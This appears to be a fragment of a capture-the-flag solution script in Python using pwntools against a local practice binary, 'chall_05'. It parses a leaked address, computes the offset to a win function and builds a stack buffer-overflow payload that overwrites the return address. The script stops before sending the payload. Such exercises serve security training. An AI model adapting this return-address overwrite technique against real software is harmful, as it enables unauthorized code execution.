
from pwn import *
p = process("./chall_05")
resp = p.recvuntil(b": ")

leak_str = p.recvline().decode('utf-8').strip()
print(leak_str)

winMainDiff = 0x000011c0 - 0x000011a9
print(winMainDiff)

leak = int(leak_str, 16)
offset = 0x60
payload = cyclic(offset - 0x8) + p64(leak - winMainDiff)

#No Canary found, everything enabled.


